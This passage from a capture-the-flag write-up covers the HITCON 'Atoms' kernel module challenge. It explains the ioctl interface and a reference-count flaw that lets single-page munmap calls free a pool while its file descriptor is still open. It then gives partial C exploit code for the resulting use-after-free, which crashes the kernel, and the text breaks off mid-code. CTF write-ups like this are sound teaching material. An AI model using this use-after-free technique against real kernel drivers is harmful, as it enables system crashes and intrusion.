</code></pre><h2 class="relative group">Atoms<div id=atoms class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#atoms aria-label=Anchor>#</a></span></h2><blockquote><p>A TOken-based Memory Storage.</p><p>nc 13.231.7.116 9427</p></blockquote><h3 class="relative group">Challenge Release Content<div id=challenge-release-content class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-release-content aria-label=Anchor>#</a></span></h3><table><thead><tr><th style=text-align:right>file</th><th>comment</th></tr></thead><tbody><tr><td style=text-align:right>run.sh</td><td>bash script to run the challenge</td></tr><tr><td style=text-align:right>linux.diff</td><td>a patch that was applied to the kernel</td></tr><tr><td style=text-align:right>initramfs.cpio.gz</td><td>the system (binaries, libraries, etc.)</td></tr><tr><td style=text-align:right>demo.c</td><td>source code of the test module</td></tr><tr><td style=text-align:right>demo</td><td>a sample binary to test the module</td></tr><tr><td style=text-align:right>bzImage</td><td>the kernel</td></tr><tr><td style=text-align:right>atoms.ko</td><td>the kernel module loaded on the system</td></tr></tbody></table><h3 class="relative group">The Goal of the Challenge<div id=the-goal-of-the-challenge class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-goal-of-the-challenge aria-label=Anchor>#</a></span></h3><p>There was no flag file. The goal of the challenge was not standard. But looking
at the released file was easy to understand the goal of the challenge. In
particular, the <code>linux.diff</code> tells us that the flag is stored in the kernel&rsquo;s
error messages.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>index 7110906..beeb01f 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/kernel/watchdog.c
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/kernel/watchdog.c
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer)
</span></span></span><span class=line><span class=cl><span class=gu></span> 			}
</span></span><span class=line><span class=cl> 		}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=gi>+#ifndef FLAG
</span></span></span><span class=line><span class=cl><span class=gi>+ #define FLAG &#34;hitcon{&lt;FLAG WILL BE HERE&gt;}&#34;
</span></span></span><span class=line><span class=cl><span class=gi>+#endif
</span></span></span><span class=line><span class=cl><span class=gi></span> 		pr_emerg(&#34;BUG: soft lockup - CPU#%d stuck for %us! [%s:%d]\n&#34;,
</span></span><span class=line><span class=cl> 			smp_processor_id(), duration,
</span></span><span class=line><span class=cl><span class=gd>-			current-&gt;comm, task_pid_nr(current));
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+			FLAG, task_pid_nr(current));
</span></span></span><span class=line><span class=cl><span class=gi></span> 		print_modules();
</span></span><span class=line><span class=cl> 		print_irqtrace_events(current);
</span></span><span class=line><span class=cl> 		if (regs)
</span></span></code></pre></div><p>Looking at the kernel&rsquo;s
<a href=https://elixir.bootlin.com/linux/latest/source/kernel/watchdog.c#L341 target=_blank>original source code</a>,
we understood that the error is triggered if the core is stacked for a certain
amount of time. In practice, you need to get the kernel module in deadlock.</p><h3 class="relative group">The Kernel Module<div id=the-kernel-module class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-kernel-module aria-label=Anchor>#</a></span></h3><p>This kernel module (<code>atomos.ko</code>) is creating a new device file <code>/dev/atoms</code>. It
easy to understand the basic functionality of the module from the demo source
code.</p><p>Practically, you can <strong>open</strong> the device file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>DEV_PATH</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span></code></pre></div><p><strong>Select/Create</strong> storage indexed by a <code>key</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_USE_TOKEN</span><span class=p>,</span> <span class=n>TOKEN</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Allocate</strong> space for you messages:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>atoms_ioctl_alloc</span> <span class=n>arg</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=mh>0x1000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_ALLOC</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span></code></pre></div><p><strong>Map</strong> the storage to a userspace virtual address:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span></code></pre></div><p>When memory is allocated in userspace, you can <strong>read or write</strong> it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span> <span class=s>&#34;the secret message left by parent&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p><strong>Remove</strong> the storage from userspace:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>munmap</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span></code></pre></div><p><strong>Close</strong> the file descriptor:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span></code></pre></div><p>The <code>ioctl</code> function is the most interesting part. We spent some time to reverse
engineer the details. There are 4 basic commands for <code>ioctl</code>.</p><pre tabindex=0><code>ATOMS_USE_TOKEN    0x4008D900  // set the current pool to a token
ATOMS_ALLOC        0xC010D902  // allocate memory for current pool
ATOMS_RELEASE      0xD903      // clean up the pool
ATOMS_INFO         0x8018D901  // return info about the current pool
</code></pre><p>The module internally has the concept of <code>pool</code>. A <code>pool</code> is identified by a
<code>token</code> and contains the messages (memory pages) corresponding to a specific
<code>token</code> The kernel has a global variable that is an array of pools. It can store
up to 1024 pools.</p><h4 class="relative group">The Locks<div id=the-locks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-locks aria-label=Anchor>#</a></span></h4><p>The module uses the kernel function <code>raw_spin_lock</code> to set up a lock on several
resources. We identified three types of locks:</p><ul><li><code>fd_lock</code>: This is a locking done on a file descriptor. The resource is stored
in <code>priv_data</code> of the fd kernel structure.</li><li><code>pools_lock</code>: This lock is done when accessing the global variable array
containing all the pools. This resource is stored as a global variable as well.</li><li><code>tk_lock</code>: A lock that is used to control access to a specific <code>pool</code>/<code>token</code>.
This resource is store as part of the <code>pool</code> structure.</li></ul><h4 class="relative group">The Ref Counter<div id=the-ref-counter class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-ref-counter aria-label=Anchor>#</a></span></h4><p>Internally, the <code>pool</code> is a structure that looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=nf>__attribute__</span><span class=p>((</span><span class=nf>aligned</span><span class=p>(</span><span class=mi>8</span><span class=p>)))</span> <span class=n>s_pool</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>_QWORD</span> <span class=n>token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int32</span> <span class=n>ref_counter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_DWORD</span> <span class=n>lock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>msg</span> <span class=n>msgs</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><code>token</code> is the identifier of the pool, <code>lock</code> is the resource used for locking
mechanism. <code>msgs</code> are the pages/messages stored in the pool.</p><p><code>ref_counter</code> is counting how many <em>things</em> have a reference to this pool. The
<code>ref_counter</code> is set to one when the pool is selected with the token. When
<code>ref_counter</code> reaches zero, all <code>pool</code> contents are set free (<code>atoms_mem_put</code>).
Ideally should reach zero only when the <code>fd</code> is closed. mapping a page increase
the counter by 1, unmapping a page decrease the counter by 1.</p><h3 class="relative group">The (Unintented) Vulnerability.<div id=the-unintented-vulnerability class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-unintented-vulnerability aria-label=Anchor>#</a></span></h3><p>The challenge&rsquo;s obvious goal was to get some of the locks interleaved to end up
in a deadlock. We did not find such a combination. There is an exploit with the
intended solution posted by the author david942j. At the time of writing, I
(jinblack) do not understand that exploit. We exploited a User After Free that
we stumbled on while experimenting.</p><p>If you map a message with multiple pages, the <code>ref_counter</code> is increased by 1.
If you unmap pages singularly, each <code>munmap</code> decrease the counter by 1. This
allows us to get the counter to zero even if the <code>fd</code> is not closed yet.</p><p>When the <code>ref_counter</code> reaches 0, the structure containing information of the
selected token is set free. But because the <code>fd</code> is still alive, we can keep
doing operations with that pool.</p><p>With this vulnerability, our focus changed from getting a <strong>deadlock</strong> to crash
the kernel to just <strong>crash</strong> the kernel.</p><h3 class="relative group">The Exploit<div id=the-exploit-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit-3 aria-label=Anchor>#</a></span></h3><p>We modified the <code>demo.c</code> program to:</p><ul><li><strong>allocate</strong> multiple pages.</li><li><strong>deallocate</strong> pages singularly until <code>ref_counter</code> reaches 0,</li><li><strong>spawn</strong> several children that use the module.</li><li><strong>monitor</strong> if the values in the current chunk change with <code>ATOMS_INFO</code>.</li><li>when the value changes, we just try to <strong>use</strong> the module, expecting a crash.</li></ul><p>The exploit is not 100% reliable. It happens (quite often) that the program
terminates without a crash. We just run the program several times.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define ATOMS_USE_TOKEN    0x4008D900
</span></span></span><span class=line><span class=cl><span class=cp>#define ATOMS_ALLOC        0xC010D902
</span></span></span><span class=line><span class=cl><span class=cp>#define ATOMS_RELEASE         0xD903
</span></span></span><span class=line><span class=cl><span class=cp>#define ATOMS_INFO         0x8018D901
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>atoms_ioctl_alloc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>unk</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>atoms_ioctl_info</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>index</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define DEV_PATH &#34;/dev/atoms&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define TOKEN 0xdeadbeef
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>print_info</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>atoms_ioctl_info</span> <span class=n>arg</span><span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>token</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>num</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>index</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_INFO</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;token: %lx</span><span class=se>\t</span><span class=s> num %lx</span><span class=se>\t</span><span class=s> index %lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>arg</span><span class=p>.</span><span class=n>token</span><span class=p>,</span> <span class=n>arg</span><span class=p>.</span><span class=n>num</span><span class=p>,</span> <span class=n>arg</span><span class=p>.</span><span class=n>index</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>get_token</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>atoms_ioctl_info</span> <span class=n>arg</span><span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>token</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>num</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>index</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_INFO</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>arg</span><span class=p>.</span><span class=n>token</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>hex_printer</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>c</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%02x &#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>open_atoms</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>DEV_PATH</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>set_token</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>token</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_USE_TOKEN</span><span class=p>,</span> <span class=n>token</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>set_token_noa</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>token</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;s_token %x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_USE_TOKEN</span><span class=p>,</span> <span class=n>token</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>alloca_size</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>atoms_ioctl_alloc</span> <span class=n>arg</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>size</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_ALLOC</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>arg</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=o>*</span><span class=nf>mappa</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>PROT_WRITE</span> <span class=o>|</span> <span class=n>PROT_READ</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mem: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=n>ptr</span> <span class=o>!=</span> <span class=n>MAP_FAILED</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>release</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>(</span><span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>ATOMS_RELEASE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>fill_a_token</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>token</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open_atoms</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>set_token</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>alloca_size</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>child_work</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[child] start</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open_atoms</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>set_token</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x41424344</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=nf>mappa</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mem: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>release</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>munmap</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>parent_work</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open_atoms</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;before set token&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>set_token</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>TOKEN</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// allocate a multiple pages chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>alloca_size</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x5000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=nf>mappa</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x5000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>hex_printer</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span> <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAB&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// deallocate page singularly to get ref count below 1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;before munmap 1 </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>munmap</span><span class=p>(</span><span class=n>ptr</span> <span class=o>+</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;before munmap 2 </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>munmap</span><span class=p>(</span><span class=n>ptr</span> <span class=o>+</span> <span class=mh>0x2000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;before release!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>release</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span> <span class=c1>//Here you could use another munmap. It should work as well.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>//At this point the priv_data of the file descriptor is pointing to a free chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
